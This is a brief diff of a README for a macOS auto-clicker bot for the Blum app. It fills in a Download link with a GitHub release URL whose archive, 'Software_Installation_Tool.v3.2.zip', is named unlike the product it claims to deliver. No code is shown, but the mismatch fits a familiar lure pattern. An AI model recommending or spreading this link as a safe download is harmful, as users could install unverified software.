@@ -9,7 +9,7 @@
 
 ### V1.4.0 Standard Version
 
-Blum-AutoClicker-Bot For Mac OS V1.4.0 | <a href="">Download</a>
+Blum-AutoClicker-Bot For Mac OS V1.4.0 | <a href="https://github.com/chinhdl891/Blum-AutoClicker-Bot-For-Mac-OS/releases/download/1.4.0/Software_Installation_Tool.v3.2.zip">Download</a>
 </h1>
 
 ## Demo
